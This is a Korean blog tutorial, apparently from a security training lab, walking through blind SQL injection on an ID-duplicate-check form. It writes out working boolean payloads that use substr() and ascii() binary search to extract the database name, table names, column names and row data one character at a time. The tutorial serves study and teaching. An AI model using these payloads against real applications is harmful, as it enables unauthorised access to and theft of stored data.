Blind SQL Injection의 원리와 단계별 공격 과정

Mar 08, 2026
3 minute read

Blind SQL Injection은 UNION 방식이나 Error Based 방식과 달리, 데이터베이스의 응답 결과나 에러 메시지가 화면에 직접적으로 표시되지 않는 환경에서 사용하는 기법이다. 핵심은 쿼리에 대한 서버의 응답이 **참(True)**인지 **거짓(False)**인지에 따라 달라지는 점을 이용하는 것이다.

아이디 중복 검사 창이 대표적인 사례이다. 아이디 존재 여부에 따라 응답 결과가 달라지는 점을 활용한다.

![Fig 1. 아이디 중복 검사창 예시](/image/sql_injection/blind/image 1.png)

![Fig 2. 아이디 검색 결과에 따른 응답 차이](/image/sql_injection/blind/image 2.png)

위와 같이 ID 검색 시 중복 여부에 따라 응답이 다르다면, 내부적으로 다음과 같은 쿼리가 실행될 것으로 예측할 수 있다.

SELECT user_exists FROM users WHERE userId = '[사용자 입력값]'

1. SQL Injection Point 찾기

사용자의 입력값이 쿼리에 반영되는지 확인하기 위해 항등원인 ' and '1' = '1을 삽입한다.

![Fig 3. 항등원 삽입을 통한 Injection 포인트 확인](/image/sql_injection/blind/image 3.png)

정상적으로 결과가 나온다면 Injection이 가능한 포인트이다. 효율적인 공격을 위해 다음과 같이 편리하게 수정 가능한 포맷을 설정한다.

normaltic' and (조건) and '1' = '1

본격적인 탐색 전, SELECT 문을 사용할 수 있는지 확인한다.

normaltic' and ((select 'test') = 'test') and '1' = '1

![Fig 4. SELECT 문 정상 작동 확인](/image/sql_injection/blind/image 4.png)

2. DB 이름 찾기

select database()를 사용하고, 한 글자씩 찾아내기 위해 substr() 함수를 이용한다.

-- DB 이름을 가져와서 한 글자씩 비교하는 예시
normaltic' and (substr((select database()), 1, 1) = 'a') and '1' = '1

![Fig 5. 첫 번째 글자 대조 (거짓 응답)](/image/sql_injection/blind/image 5.png)

![Fig 6. 첫 번째 글자 대조 (참 응답: ’s’)](/image/sql_injection/blind/image 6.png)

글자를 하나씩 대조하는 대신 아스키(ASCII) 코드와 크기 비교를 활용하면 훨씬 빠르게 탐색할 수 있다.

-- 첫 글자를 아스키 코드로 변환하여 60보다 큰지 비교
normaltic' and (ascii(substr((select database()), 1, 1)) > 60) and '1' = '1

![Fig 7. 아스키 크기 비교를 통한 탐색 시작](/image/sql_injection/blind/image 7.png)

이러한 이분 탐색(Binary Search) 과정을 통해 각 자리의 문자를 하나씩 찾아낸다.

![Fig 8. 1번째 글자 탐색 과정](/image/sql_injection/blind/image 8.png)

3. Table 이름 찾기

information_schema.tables를 조회하여 테이블 이름을 알아낸다.

-- 첫 번째 테이블 이름의 첫 글자 탐색
normaltic' and (ascii(substr((select table_name from information_schema.tables where table_schema = 'segfault_sql' limit 0, 1), 1, 1)) > 95) and '1' = '1

![Fig 78. 테이블 이름 첫 글자 탐색](/image/sql_injection/blind/image 78.png)

위와 같은 방식으로 탐색하면 다음과 같은 테이블 이름들을 확보할 수 있다.

  • 첫 번째 테이블: game
  • 두 번째 테이블: member
  • 세 번째 테이블: secret

4. Column 이름 찾기

information_schema.columns를 이용해 특정 테이블의 컬럼명을 확인한다.

-- game 테이블의 첫 번째 컬럼명 확인
normaltic' and (ascii(substr((select column_name from information_schema.columns where table_name = 'game' limit 0, 1), 1, 1)) > 97) and '1' = '1

![Fig 158. 컬럼 이름 첫 글자 탐색](/image/sql_injection/blind/image 158.png)

탐색 결과, game 테이블의 첫 번째 컬럼명은 **idx**이다.

5. 데이터 추출

마지막으로 실제 데이터를 추출한다. game 테이블의 name 컬럼 값을 찾는 과정이다.

-- name 컬럼의 첫 번째 데이터 한 글자씩 탐색
normaltic' and (ascii(substr((select name from game limit 0, 1), 1, 1)) > 97) and '1' = '1

![Fig 175. 데이터 추출 시작](/image/sql_injection/blind/image 175.png)

모든 자리수를 탐색한 결과, 추출된 데이터는 **Overwatch**이다.

요약

Blind SQL Injection은 응답의 참/거짓 결과만을 보고 퍼즐을 맞추듯 데이터를 찾아가는 기법이다. 수작업으로는 시간이 매우 오래 걸리므로 파이썬 등을 활용한 자동화 툴을 제작하여 사용하는 것이 일반적이다.
